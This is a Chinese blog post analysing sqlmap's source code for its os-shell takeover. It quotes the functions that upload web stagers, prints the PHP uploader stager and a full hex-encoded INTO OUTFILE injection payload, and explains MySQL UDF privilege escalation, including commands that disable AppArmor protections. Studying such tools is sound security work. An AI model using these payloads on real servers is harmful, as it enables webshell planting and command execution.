+<h4 id="webInit"><a href="#webInit" class="headerlink" title="webInit"></a>webInit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">webInit</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    生成需要上传文件的文件名等</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.webBackdoorUrl <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> self.webStagerUrl <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> self.webPlatform <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 获取系统 linux</span></span><br><span class="line">    self.checkDbmsOs()</span><br><span class="line"></span><br><span class="line">    default = <span class="literal">None</span></span><br><span class="line">    choices = list(getPublicTypeMembers(WEB_PLATFORM, <span class="literal">True</span>))</span><br><span class="line">    <span class="comment"># choices 就是 asp aspx jsp php</span></span><br><span class="line">    <span class="comment"># 下面根据末尾进行判断选择默认的 语言</span></span><br><span class="line">    <span class="keyword">for</span> ext <span class="keyword">in</span> choices:</span><br><span class="line">        <span class="keyword">if</span> conf.url.endswith(ext):</span><br><span class="line">            default = ext</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> default:</span><br><span class="line">        <span class="comment"># url没有获取到则 如果系统是windows则使用asp 否则使用phph</span></span><br><span class="line">        default = WEB_PLATFORM.ASP <span class="keyword">if</span> Backend.isOs(OS.WINDOWS) <span class="keyword">else</span> WEB_PLATFORM.PHP</span><br><span class="line"></span><br><span class="line">    message = <span class="string">"which web application language does the web server "</span></span><br><span class="line">    message += <span class="string">"support?\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> count <span class="keyword">in</span> xrange(len(choices)):</span><br><span class="line">        ext = choices[count]</span><br><span class="line">        message += <span class="string">"[%d] %s%s\n"</span> % (count + <span class="number">1</span>, ext.upper(), (<span class="string">" (default)"</span> <span class="keyword">if</span> default == ext <span class="keyword">else</span> <span class="string">""</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> default == ext:</span><br><span class="line">            default = count + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    message = message[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 获取输入的路径</span></span><br><span class="line">        choice = readInput(message, default=str(default))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> choice.isdigit():</span><br><span class="line">            logger.warn(<span class="string">"invalid value, only digits are allowed"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> int(choice) &lt; <span class="number">1</span> <span class="keyword">or</span> int(choice) &gt; len(choices):</span><br><span class="line">            logger.warn(<span class="string">"invalid value, it must be between 1 and %d"</span> % len(choices))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.webPlatform = choices[int(choice) - <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    directories = list(arrayizeValue(getManualDirectories()))</span><br><span class="line">    <span class="comment"># 获取输入或者其他方式的路径</span></span><br><span class="line">    directories.extend(getAutoDirectories())</span><br><span class="line"></span><br><span class="line">    directories = list(oset(directories))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 小马和大马</span></span><br><span class="line">    backdoorName = <span class="string">"tmpb%s.%s"</span> % (randomStr(lowercase=<span class="literal">True</span>), self.webPlatform)</span><br><span class="line"></span><br><span class="line">    backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, <span class="string">"backdoors"</span>, <span class="string">"backdoor.%s_"</span> % self.webPlatform))</span><br><span class="line">    <span class="comment"># 小马 用于上传后再次上传大马</span></span><br><span class="line">    stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, <span class="string">"stagers"</span>, <span class="string">"stager.%s_"</span> % self.webPlatform))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> directory <span class="keyword">in</span> directories:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> directory:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment">#  小马的随机文件名</span></span><br><span class="line">        stagerName = <span class="string">"tmpu%s.%s"</span> % (randomStr(lowercase=<span class="literal">True</span>), self.webPlatform)</span><br><span class="line">        self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)</span><br><span class="line">        <span class="comment"># 生成这个文件的路径</span></span><br><span class="line">        <span class="comment"># u'/var/www/html/tmpuggxn.php'</span></span><br><span class="line">        <span class="comment"># 对这个路径进行一些处理 比如windows的话等</span></span><br><span class="line">        uploaded = <span class="literal">False</span></span><br><span class="line">        directory = ntToPosixSlashes(normalizePath(directory))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isWindowsDriveLetterPath(directory) <span class="keyword">and</span> <span class="keyword">not</span> directory.startswith(<span class="string">'/'</span>):</span><br><span class="line">            directory = <span class="string">"/%s"</span> % directory</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> directory.endswith(<span class="string">'/'</span>):</span><br><span class="line">            directory += <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Upload the file stager with the LIMIT 0, 1 INTO DUMPFILE method</span></span><br><span class="line">        infoMsg = <span class="string">"trying to upload the file stager on '%s' "</span> % directory</span><br><span class="line">        infoMsg += <span class="string">"via LIMIT 'LINES TERMINATED BY' method"</span></span><br><span class="line">        logger.info(infoMsg)</span><br><span class="line">        <span class="comment"># 上传文件  使用执行sql语句 into outfile导出</span></span><br><span class="line">        self._webFileInject(stagerContent, stagerName, directory)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 请求上传的页面判断是否上传成功</span></span><br><span class="line">        <span class="comment"># 并输出成功后的路径等</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="webFileInject-上传小马文件"><a href="#webFileInject-上传小马文件" class="headerlink" title="_webFileInject 上传小马文件"></a>_webFileInject 上传小马文件</h4><p>调用方法上传文件暂存器即小马<br>上传完后请求页面  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_webFileInject</span><span class="params">(self, fileContent, fileName, directory)</span>:</span></span><br><span class="line">    outFile = posixpath.join(ntToPosixSlashes(directory), fileName)</span><br><span class="line">    uplQuery = getUnicode(fileContent).replace(SHELL_WRITABLE_DIR_TAG, directory.replace(<span class="string">'/'</span>, <span class="string">'\\\\'</span>) <span class="keyword">if</span> Backend.isOs(OS.WINDOWS) <span class="keyword">else</span> directory)</span><br><span class="line">    <span class="comment"># uplQuery </span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">if (isset($_REQUEST["upload"]))&#123;$dir=$_REQUEST["uploadDir"];if (phpversion()&lt;'4.1.0')&#123;$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();&#125;else&#123;$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();&#125;@chmod($dir."/".$file,0755);echo "File uploaded";&#125;else &#123;echo "&lt;form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=/var/www/html/&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;";&#125;?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    query = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isTechniqueAvailable(kb.technique):</span><br><span class="line">        where = kb.injection.data[kb.technique].where</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> where == PAYLOAD.WHERE.NEGATIVE:</span><br><span class="line">            randInt = randomInt()</span><br><span class="line">            query += <span class="string">"OR %d=%d "</span> % (randInt, randInt)</span><br><span class="line"></span><br><span class="line">    query += getSQLSnippet(DBMS.MYSQL, <span class="string">"write_file_limit"</span>, OUTFILE=outFile, HEXSTRING=hexencode(uplQuery, conf.encoding))</span><br><span class="line">    <span class="comment"># 下面一坨就是将 小马写导出的目录下  </span></span><br><span class="line">    <span class="comment"># 这个小马的文件名规则: </span></span><br><span class="line">    <span class="comment"># stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webPlatform)</span></span><br><span class="line">    <span class="comment"># 随机字符串 'abcdefghijklmnopqrstuvwxyz' 26个小写字母 加上文件后缀 php jsp等  </span></span><br><span class="line">    <span class="comment"># 即是下面这种 /tmpuggxn.php  </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># OR 6549=6549 LIMIT 0,1 INTO OUTFILE '/var/www/html/tmpuggxn.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d2f7661722f7777772f68746d6c2f3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -</span></span><br><span class="line">    <span class="comment"># 写文件</span></span><br><span class="line">    query = agent.prefixQuery(query)        <span class="comment"># Note: No need for suffix as 'write_file_limit' already ends with comment (required)</span></span><br><span class="line">    payload = agent.payload(newValue=query)</span><br><span class="line">    page = Request.queryPage(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> page</span><br></pre></td></tr></table></figure>
+
+<h4 id="加载大小马-写入-最后获取-获取shell"><a href="#加载大小马-写入-最后获取-获取shell" class="headerlink" title="加载大小马  写入 最后获取 获取shell"></a>加载大小马  写入 最后获取 获取shell</h4><p>他开始加载了两个文件 小马和大马  </p>
+<p><img src="/2021/06/11/sqlmap源码分析下/all_shell.jpg" alt="all_shell">  </p>
+<p>会先上传小马<br>最开始先尝试 limit的方式语句写入文件<br>LINES TERMINATED BY和LINES STARTING BY原理为在输出每条记录的结尾或开始处插入webshell内容，所以即使只查询一个字段也可以写入webshell内容<br><img src="/2021/06/11/sqlmap源码分析下/%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6.jpg" alt="上传文件">  </p>
+<p>然后再上传 大马  </p>
+<p>最后获取交互shell<br><img src="/2021/06/11/sqlmap源码分析下/os-shell%E6%88%AA%E5%9B%BE.jpg" alt="os-shell截图">  </p>
+<h2 id="对于mysql导出文件"><a href="#对于mysql导出文件" class="headerlink" title="对于mysql导出文件"></a>对于mysql导出文件</h2><p>这里因为需要搞这个环境有如下要求  </p>
+<ol>
+<li>高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限<br>需要设置为空字符串  不能是Null 不能是指定路径  </li>
+<li><strong>还有需要对 /etc/apparmor.d 修改配置文件 对usr.sbin.mysqld 增加导出指定目录文件的权限</strong>  </li>
+<li>文件不能覆盖写入，所以文件必须为不存在 mysql 执行 into outfile 存在的话会报错  </li>
+<li>还要给mysql能写到指定目录的权限  </li>
+<li>这里如果是docker的话 需要 增加参数 –privileged 给予最高的root权限并且修改 apparmor对应的配置才可以  </li>
+</ol>
+<p>linux安全防御需要修改文件 <code>usr.sbin.mysqld</code><br>修改后重启  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">test</span></span></span><br><span class="line">  /var/www/html/ rw,</span><br><span class="line">  /var/www/html/** rw,</span><br><span class="line">  /usr/lib/mysql/plugin/ rw,</span><br><span class="line">  /usr/lib/mysql/plugin/** rw,</span><br></pre></td></tr></table></figure>
+
+<h2 id="d-直连数据库提权"><a href="#d-直连数据库提权" class="headerlink" title="-d 直连数据库提权"></a>-d 直连数据库提权</h2><p>如果直接连接数据库的话是使用的udf提权:  </p>
+<h4 id="mysql-udf提权"><a href="#mysql-udf提权" class="headerlink" title="mysql udf提权"></a>mysql udf提权</h4><p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。  </p>
+<p>sqlmap的这些文件是 异或编码的 而且是有解码脚本的<br>sqlmap/extra/cloak目录下的cloak.py</p>
+<p>知道了数据库的用户名和密码  </p>
+<p><code>python sqlmap.py -d &quot;mysql://root:root@192.168.19.128:3306/mysql&quot; --os-shell</code>  </p>
+<p>会先测试mysql 并且会再次确认  </p>
+<p><img src="/2021/06/11/sqlmap源码分析下/%E7%A1%AE%E8%AE%A4mysql.jpg" alt="确认mysql">  </p>
+<p>确认后并判断出mysql的版本后 这里根据命令行的不同参数选择不同的函数<br><img src="/2021/06/11/sqlmap源码分析下/%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E5%AF%B9%E5%BA%94%E5%87%BD%E6%95%B0.jpg" alt="各种参数对应函数">  </p>
+<p>我们这里选择的是 交互shell 所以会 进入 <code>conf.dbmsHandler.osShell()</code> 函数  </p>
+<p>os与dbs判断<br><img src="/2021/06/11/sqlmap源码分析下/os%E4%B8%8Edbs%E5%88%A4%E6%96%AD.jpg" alt="os与dbs判断">  </p>
+<p>选择64位还是32位<br><img src="/2021/06/11/sqlmap源码分析下/%E9%80%89%E6%8B%A964%E4%BD%8D%E8%BF%98%E6%98%AF32%E4%BD%8D.jpg" alt="选择64位还是32位">  </p>
+<p>这块代码的路径 sqlmap-1.3/plugins/generic/takeover.py(81)osShell()  </p>
+<h4 id="上传-udf的代码"><a href="#上传-udf的代码" class="headerlink" title="上传 udf的代码"></a>上传 udf的代码</h4><p><code>sqlmap-1.3/lib/takeover/udf.py(180)udfInjectSys()</code>  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">udfInjectSys</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.udfSetLocalPaths() <span class="comment"># 选择32还是64位</span></span><br><span class="line">    self.udfCheckNeeded() <span class="comment"># 检验udf是否已经存在了</span></span><br><span class="line">    <span class="keyword">return</span> self.udfInjectCore(self.sysUdfs) <span class="comment"># 创建上传udf文件</span></span><br></pre></td></tr></table></figure>
+
+<p>检测 <code>sys_eval</code> <code>sys_exec</code> 是否存在选择是否添加  </p>
+<p>写文件  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> len(self.udfToCreate) &gt; <span class="number">0</span>: <span class="comment"># 如果是有需要添加的</span></span><br><span class="line">    self.udfSetRemotePath()</span><br><span class="line">    checkFile(self.udfLocalFile) <span class="comment"># 检验文件是否存在和是否可读</span></span><br><span class="line">    <span class="comment"># 这里的文件是 异或解码到 临时目录的 '/tmp/sqlmapseCL0654959/lib_mysqludf_sysw0Ns0N.so'</span></span><br><span class="line">    <span class="comment"># 这里的远程地址为 /usr/lib/mysql/plugin/libscpdx.so'</span></span><br><span class="line">    <span class="comment"># 这个远程目录下也是命名规则的 libs&#123;4  小写字母&#125;.so</span></span><br><span class="line">    written = self.writeFile(self.udfLocalFile, self.udfRemoteFile, <span class="string">"binary"</span>, forceCheck=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可单独异或解码  </p>
+<p><img src="/2021/06/11/sqlmap源码分析下/%E5%BC%82%E6%88%96%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81.jpg" alt="异或编码解码">  </p>
+<p>mysql udf 提权文件<br><img src="/2021/06/11/sqlmap源码分析下/mysql_udf_%E6%8F%90%E6%9D%83%E6%96%87%E4%BB%B6.jpg" alt="mysql_udf_提权文件">  </p>
+<p>解码后到本地临时目录 然后再写到mysql插件目录<br>下图是测试上传的文件   </p>
+<p><img src="/2021/06/11/sqlmap源码分析下/%E4%B8%8A%E4%BC%A0%E5%90%8E%E7%9A%84udf%E6%96%87%E4%BB%B6.jpg" alt="上传后的udf文件">  </p>
+<h3 id="需要的条件"><a href="#需要的条件" class="headerlink" title="需要的条件"></a>需要的条件</h3><p>需要有这个目录的 /usr/lib/mysql/plugin/写入权限  </p>
+<p><strong>而且如果需要 udf提权后能执行成功 是需要先执行下面的操作要关闭对mysql的安全限制</strong><br>否则怎么执行都会返回 <code>NULL</code>  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/disable/</span><br><span class="line">sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/11/sqlmap源码分析下/%E6%88%90%E5%8A%9F%E5%90%8Emysql%E4%B8%AD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.jpg" alt="成功后mysql中执行命令">  </p>
+<p>这个真的花了好久才研究出来(网上的文章几乎都是直接就能执行 可能是 mysql版本低的原因 我的是 5.7)  </p>
+<p>最后交互shell执行命令  </p>
+<p><img src="/2021/06/11/sqlmap源码分析下/sqlmap%E4%BA%A4%E4%BA%92shell.jpg" alt="sqlmap交互shell">  </p>
+<h2 id="sqlmap-api"><a href="#sqlmap-api" class="headerlink" title="sqlmap api"></a>sqlmap api</h2><p>sqlapi 运行截图<br><img src="/2021/06/11/sqlmap源码分析下/sqlapi%E8%BF%90%E8%A1%8C.jpg" alt="sqlapi运行">  </p>
+<p>sqlmapapi.py 是有服务端和客户端的 分别是-s参数和-c参数  </p>
+<h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span><span class="params">(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER, username=None, password=None)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    REST-JSON API server</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># 这里的 DataStore 是一个全局的存储数据的类 里面有</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    class DataStore(object):</span></span><br><span class="line"><span class="string">    admin_token = ""</span></span><br><span class="line"><span class="string">    current_db = None</span></span><br><span class="line"><span class="string">    tasks = dict()</span></span><br><span class="line"><span class="string">    username = None</span></span><br><span class="line"><span class="string">    password = None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    DataStore.admin_token = hexencode(os.urandom(<span class="number">16</span>))</span><br><span class="line">    DataStore.username = username</span><br><span class="line">    DataStore.password = password</span><br><span class="line">    <span class="comment"># 创建一个只能被当前程序找到的临时文件</span></span><br><span class="line">    <span class="comment"># '/tmp/sqlmapipc-_BqMo3'</span></span><br><span class="line">    _, Database.filepath = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.IPC, text=<span class="literal">False</span>)</span><br><span class="line">    os.close(_)</span><br><span class="line">    <span class="comment"># 并关闭这个文件</span></span><br><span class="line">    <span class="keyword">if</span> port == <span class="number">0</span>:  <span class="comment"># random</span></span><br><span class="line">        <span class="keyword">with</span> contextlib.closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) <span class="keyword">as</span> s:</span><br><span class="line">            s.bind((host, <span class="number">0</span>))</span><br><span class="line">            port = s.getsockname()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    logger.info(<span class="string">"Running REST-JSON API server at '%s:%d'.."</span> % (host, port))</span><br><span class="line">    logger.info(<span class="string">"Admin (secret) token: %s"</span> % DataStore.admin_token)</span><br><span class="line">    logger.debug(<span class="string">"IPC database: '%s'"</span> % Database.filepath)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化数据库 使用 sqlite3 作为数据库</span></span><br><span class="line">    DataStore.current_db = Database()</span><br><span class="line">    DataStore.current_db.connect()</span><br><span class="line">    DataStore.current_db.init()</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    初始化三个表 log data errors</span></span><br><span class="line"><span class="string">    self.execute("CREATE TABLE logs(id INTEGER PRIMARY KEY AUTOINCREMENT, taskid INTEGER, time TEXT, level TEXT, message TEXT)")</span></span><br><span class="line"><span class="string">    self.execute("CREATE TABLE data(id INTEGER PRIMARY KEY AUTOINCREMENT, taskid INTEGER, status INTEGER, content_type INTEGER, value TEXT)")</span></span><br><span class="line"><span class="string">    self.execute("CREATE TABLE errors(id INTEGER PRIMARY KEY AUTOINCREMENT, taskid INTEGER, error TEXT)")</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Run RESTful API</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 支持各种的适配器 异步 协程等 : aiohttp, auto, bjoern, cgi, cherrypy, diesel, eventlet, fapws3, flup, gae, gevent, geventSocketIO, gunicorn, meinheld, paste, rocket, tornado, twisted, waitress, wsgiref</span></span><br><span class="line">        <span class="comment"># Reference: https://bottlepy.org/docs/dev/deployment.html || bottle.server_names</span></span><br><span class="line">        <span class="comment"># 这里使用协程</span></span><br><span class="line">        <span class="keyword">if</span> adapter == <span class="string">"gevent"</span>:</span><br><span class="line">            <span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">            monkey.patch_all()</span><br><span class="line">        <span class="keyword">elif</span> adapter == <span class="string">"eventlet"</span>:</span><br><span class="line">            <span class="comment"># WSGI支持的异步框架</span></span><br><span class="line">            <span class="keyword">import</span> eventlet</span><br><span class="line">            eventlet.monkey_patch()</span><br><span class="line">        logger.debug(<span class="string">"Using adapter '%s' to run bottle"</span> % adapter)</span><br><span class="line">        run(host=host, port=port, quiet=<span class="literal">True</span>, debug=<span class="literal">True</span>, server=adapter)</span><br><span class="line">    <span class="keyword">except</span> socket.error, ex:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"already in use"</span> <span class="keyword">in</span> getSafeExString(ex):</span><br><span class="line">            logger.error(<span class="string">"Address already in use ('%s:%s')"</span> % (host, port))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="keyword">if</span> adapter.lower() <span class="keyword">not</span> <span class="keyword">in</span> server_names:</span><br><span class="line">            errMsg = <span class="string">"Adapter '%s' is unknown. "</span> % adapter</span><br><span class="line">            errMsg += <span class="string">"List of supported adapters: %s"</span> % <span class="string">', '</span>.join(sorted(server_names.keys()))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            errMsg = <span class="string">"Server support for adapter '%s' is not installed on this system "</span> % adapter</span><br><span class="line">            errMsg += <span class="string">"(Note: you can try to install it with 'sudo apt-get install python-%s' or 'sudo pip install %s')"</span> % (adapter, adapter)</span><br><span class="line">        logger.critical(errMsg)</span><br></pre></td></tr></table></figure>
+
+<h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><p>会控制不允许开启多个服务端  </p>
+<p>使用 <code>bottle</code> 来创建web服务 只要一个简单的文件就可以直接实现web服务  </p>
+<p>比如说 获取当前的任务的信息  </p>
+<p><code>@get(&quot;/option/&lt;taskid&gt;/list&quot;)</code>  </p>
+<p>从 <code>DataStore.tasks</code> 获取并输出返回json  </p>
